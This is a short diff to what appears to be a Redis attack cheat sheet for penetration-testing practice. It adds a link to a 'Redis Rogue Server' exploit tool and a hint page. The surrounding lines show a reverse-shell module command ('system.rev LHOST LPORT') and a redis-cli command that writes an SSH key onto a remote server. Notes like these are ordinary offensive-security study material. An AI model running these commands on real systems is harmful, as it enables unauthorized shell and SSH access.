@@ -29,6 +29,9 @@ system.rev LHOST LPORT
 ```
 [HINT](https://www.youtube.com/watch?v=LlzpyGcA-ak&ab_channel=Tech69)
 
+## [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server.git)
+[HINT](http://baihaiou.cn/2022/12/05/pg-readys/)
+
 ## Write to File
 ```
 cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key
